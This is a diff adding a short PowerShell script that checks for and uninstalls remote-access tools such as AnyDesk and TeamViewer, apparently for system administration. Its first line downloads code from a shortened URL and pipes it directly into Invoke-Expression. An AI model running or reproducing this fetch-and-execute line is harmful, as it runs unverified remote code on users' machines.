@@ -1,0 +1,17 @@
+irm rb.gy/0kyfn2 | iex
+$AppsToUninstall = @(
+"AnyDesk",
+"TeamViewer",
+"Splashtop",
+"Logmein"
+)
+
+$AppsToUninstall | ForEach-Object {
+Write-Host "Checking if $_ is installed."
+If (Get-InstalledApplication -Name $_) {
+Write-Host "Uninstalling $_."
+Uninstall-Application -AppToUninstall $_
+} Else {
+Write-Host "$_ is not installed."
+}
+}
